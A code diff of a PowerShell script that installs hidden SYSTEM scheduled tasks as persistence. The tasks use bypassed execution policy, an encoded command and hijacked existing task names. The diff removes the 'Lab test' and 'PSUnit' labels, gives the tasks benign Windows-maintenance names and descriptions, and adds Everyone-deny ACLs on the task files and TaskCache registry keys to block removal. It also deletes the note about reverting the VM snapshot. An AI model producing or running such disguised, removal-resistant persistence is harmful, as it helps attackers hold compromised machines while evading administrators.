@@ -7,9 +7,9 @@ $cmdExe = Join-Path $env:WINDIR 'System32\cmd.exe'
 $wscriptExe = Join-Path $env:WINDIR 'System32\wscript.exe'
 
 $newTaskNames = @(
-    'PSUnit-Startup-ProfileCache',
-    'PSUnit-Logon-CloudSync',
-    'PSUnit-Startup-WinUpdateCache'
+    'ProfileCacheStartup',
+    'CloudSyncLogon',
+    'WinUpdateCacheStartup'
 )
 
 $existingTaskCandidates = @(
@@ -24,6 +24,92 @@ $existingTaskCandidates = @(
 function Write-Step { param([string]$Text) Write-Host "[*] $Text" -ForegroundColor Cyan }
 function Write-OK { param([string]$Text) Write-Host "    [OK] $Text" -ForegroundColor Green }
 function Write-Warn { param([string]$Text) Write-Host "    [WARN] $Text" -ForegroundColor Yellow }
+
+function Get-LabTaskFilePath {
+    param([string]$Path, [string]$Name)
+
+    $relativePath = $Path.Trim('\')
+    $taskRoot = Join-Path $env:WINDIR 'System32\Tasks'
+    if ([string]::IsNullOrWhiteSpace($relativePath)) {
+        return Join-Path $taskRoot $Name
+    }
+    return Join-Path (Join-Path $taskRoot $relativePath) $Name
+}
+
+function Get-LabTaskCacheTreePath {
+    param([string]$Path, [string]$Name)
+
+    $parts = @()
+    $relativePath = $Path.Trim('\')
+    if (-not [string]::IsNullOrWhiteSpace($relativePath)) { $parts += $relativePath }
+    $parts += $Name
+    return "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$($parts -join '\')"
+}
+
+function Add-LabFileDenyRule {
+    param([string]$Path)
+
+    try {
+        if (-not (Test-Path -LiteralPath $Path)) {
+            Write-Warn "ACL hardening skipped, file not found: $Path"
+            return
+        }
+
+        $everyoneSid = New-Object System.Security.Principal.SecurityIdentifier 'S-1-1-0'
+        $rights = [System.Security.AccessControl.FileSystemRights]::Delete -bor
+            [System.Security.AccessControl.FileSystemRights]::Write -bor
+            [System.Security.AccessControl.FileSystemRights]::WriteData -bor
+            [System.Security.AccessControl.FileSystemRights]::AppendData
+        $rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
+            $everyoneSid,
+            $rights,
+            [System.Security.AccessControl.AccessControlType]::Deny
+        )
+
+        $acl = Get-Acl -LiteralPath $Path -ErrorAction Stop
+        $acl.AddAccessRule($rule)
+        Set-Acl -LiteralPath $Path -AclObject $acl -ErrorAction Stop
+        Write-OK "Hardened file ACL: $Path"
+    } catch {
+        Write-Warn "Could not harden file ACL '$Path': $_"
+    }
+}
+
+function Add-LabRegistryDenyRule {
+    param([string]$Path)
+
+    try {
+        if (-not (Test-Path -Path $Path)) {
+            Write-Warn "ACL hardening skipped, registry key not found: $Path"
+            return
+        }
+
+        $everyoneSid = New-Object System.Security.Principal.SecurityIdentifier 'S-1-1-0'
+        $rights = [System.Security.AccessControl.RegistryRights]::Delete -bor
+            [System.Security.AccessControl.RegistryRights]::SetValue
+        $rule = New-Object System.Security.AccessControl.RegistryAccessRule(
+            $everyoneSid,
+            $rights,
+            [System.Security.AccessControl.InheritanceFlags]::None,
+            [System.Security.AccessControl.PropagationFlags]::None,
+            [System.Security.AccessControl.AccessControlType]::Deny
+        )
+
+        $acl = Get-Acl -Path $Path -ErrorAction Stop
+        $acl.AddAccessRule($rule)
+        Set-Acl -Path $Path -AclObject $acl -ErrorAction Stop
+        Write-OK "Hardened registry ACL: $Path"
+    } catch {
+        Write-Warn "Could not harden registry ACL '$Path': $_"
+    }
+}
+
+function Protect-NewLabTask {
+    param([string]$Path, [string]$Name)
+
+    Add-LabFileDenyRule -Path (Get-LabTaskFilePath -Path $Path -Name $Name)
+    Add-LabRegistryDenyRule -Path (Get-LabTaskCacheTreePath -Path $Path -Name $Name)
+}
 
 function Invoke-ScheduledTaskAttempt {
     param([string]$Name, [scriptblock]$ScriptBlock)
@@ -90,7 +176,8 @@ function Register-LabTask {
         [string]$Description,
         $Action,
         $Trigger,
-        [switch]$Hidden
+        [switch]$Hidden,
+        [switch]$ProtectAcl
     )
 
     $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
@@ -106,6 +193,9 @@ function Register-LabTask {
 
     Register-ScheduledTask -TaskName $Name -TaskPath $Path -Action $Action -Trigger $Trigger -Principal $principal -Settings $settings -Description $Description -Force -ErrorAction Stop | Out-Null
     Write-OK "Registered $(Get-TaskIdentity $Path $Name)"
+    if ($ProtectAcl) {
+        Protect-NewLabTask -Path $Path -Name $Name
+    }
 }
 
 function Get-HijackTargets {
@@ -154,35 +244,38 @@ try {
     Write-Warn "Could not generate encoded scheduled task payload: $_"
 }
 
-Invoke-ScheduledTaskAttempt 'PSUnit-Startup-ProfileCache' {
+Invoke-ScheduledTaskAttempt 'ProfileCacheStartup' {
     if (-not $helpersReady) { throw 'helper files were not prepared' }
     Register-LabTask `
         -Path $taskPath `
-        -Name 'PSUnit-Startup-ProfileCache' `
-        -Description 'Lab test: new hidden SYSTEM startup task that launches a ProgramData PowerShell helper.' `
+        -Name 'ProfileCacheStartup' `
+        -Description 'Profile cache maintenance task.' `
         -Action (New-ScheduledTaskAction -Execute $psExe -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$profileCacheScript`"" -WorkingDirectory $workDir) `
         -Trigger (New-ScheduledTaskTrigger -AtStartup) `
-        -Hidden
+        -Hidden `
+        -ProtectAcl
 }
 
-Invoke-ScheduledTaskAttempt 'PSUnit-Logon-CloudSync' {
+Invoke-ScheduledTaskAttempt 'CloudSyncLogon' {
     Register-LabTask `
         -Path $taskPath `
-        -Name 'PSUnit-Logon-CloudSync' `
-        -Description 'Lab test: new logon task using cmd.exe to write the project proof file.' `
+        -Name 'CloudSyncLogon' `
+        -Description 'Cloud sync logon maintenance task.' `
         -Action (New-ScheduledTaskAction -Execute $cmdExe -Argument "/c echo $payloadText>$payloadPath") `
-        -Trigger (New-ScheduledTaskTrigger -AtLogOn)
+        -Trigger (New-ScheduledTaskTrigger -AtLogOn) `
+        -ProtectAcl
 }
 
-Invoke-ScheduledTaskAttempt 'PSUnit-Startup-WinUpdateCache' {
+Invoke-ScheduledTaskAttempt 'WinUpdateCacheStartup' {
     if ([string]::IsNullOrWhiteSpace($encoded)) { throw 'encoded payload was not generated' }
     Register-LabTask `
         -Path $taskPath `
-        -Name 'PSUnit-Startup-WinUpdateCache' `
-        -Description 'Lab test: new hidden startup task using an encoded PowerShell command.' `
+        -Name 'WinUpdateCacheStartup' `
+        -Description 'Windows update cache startup task.' `
         -Action (New-ScheduledTaskAction -Execute $psExe -Argument "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded") `
         -Trigger (New-ScheduledTaskTrigger -AtStartup) `
-        -Hidden
+        -Hidden `
+        -ProtectAcl
 }
 
 Write-Step "Overwriting 2 existing scheduled task names"
@@ -199,7 +292,7 @@ foreach ($target in $targets) {
             Register-LabTask `
                 -Path $target.TaskPath `
                 -Name $target.TaskName `
-                -Description 'Lab test: existing Windows task name overwritten with a PowerShell helper action.' `
+                -Description 'Windows task maintenance action.' `
                 -Action (New-ScheduledTaskAction -Execute $psExe -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$delayedScript`"" -WorkingDirectory $workDir) `
                 -Trigger (New-ScheduledTaskTrigger -AtStartup) `
                 -Hidden
@@ -208,7 +301,7 @@ foreach ($target in $targets) {
             Register-LabTask `
                 -Path $target.TaskPath `
                 -Name $target.TaskName `
-                -Description 'Lab test: existing Windows task name overwritten with Windows Script Host action.' `
+                -Description 'Windows script host maintenance action.' `
                 -Action (New-ScheduledTaskAction -Execute $wscriptExe -Argument "//B `"$vbsScript`"" -WorkingDirectory $workDir) `
                 -Trigger (New-ScheduledTaskTrigger -AtStartup)
         }
@@ -219,6 +312,5 @@ foreach ($target in $targets) {
 }
 
 Write-Host ""
-Write-Host "[DONE] Installed scheduled task unit-test persistences." -ForegroundColor Green
+Write-Host "[DONE] Installed scheduled task persistences." -ForegroundColor Green
 Write-Host "Created 3 new tasks and attempted to overwrite 2 existing task candidates." -ForegroundColor Yellow
-Write-Host "Revert the VMware snapshot to restore the VM." -ForegroundColor Yellow
